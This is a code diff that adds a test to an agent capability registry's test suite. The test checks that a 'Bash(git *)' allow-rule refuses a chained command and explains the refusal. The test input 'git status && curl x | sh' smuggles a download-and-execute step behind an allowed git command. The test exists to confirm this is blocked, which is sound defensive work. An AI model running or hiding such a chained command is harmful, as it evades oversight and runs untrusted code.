@@ -73,6 +73,31 @@ describe('managed agent capabilities', () => {
     );
   });
 
+  it('says a compound Bash command was refused for chaining, and keeps the code', async () => {
+    const parent = createRegistry();
+    parent.register(tool('Bash'));
+    const registry = createCapabilityRegistry(parent, ['Bash(git *)']);
+
+    const compound = await registry.execute(
+      { id: '5', name: 'Bash', arguments: { command: 'git status && curl x | sh' } },
+      context,
+    );
+    const plain = await registry.execute(
+      { id: '6', name: 'Bash', arguments: { command: 'npm publish' } },
+      context,
+    );
+
+    expect(compound.structuredError?.code).toBe('capability_denied');
+    expect(compound.structuredError?.message).toContain('Capability denied');
+    expect(compound.structuredError?.message).toContain('chains, pipes, redirects or substitutes');
+    expect(compound.structuredError?.message).toContain('its own Bash call');
+    expect(compound.structuredError?.message).toContain('allowed-tools rules');
+    expect(compound.structuredError?.message).toContain('without these characters');
+    expect(compound.structuredError?.message).toContain('a different tool');
+    expect(plain.structuredError?.code).toBe('capability_denied');
+    expect(plain.structuredError?.message).not.toContain('chains, pipes');
+  });
+
   it('does not expose recursive, question, or MCP lifecycle tools through wildcard inheritance', () => {
     const parent = createRegistry();
     parent.registerAll([
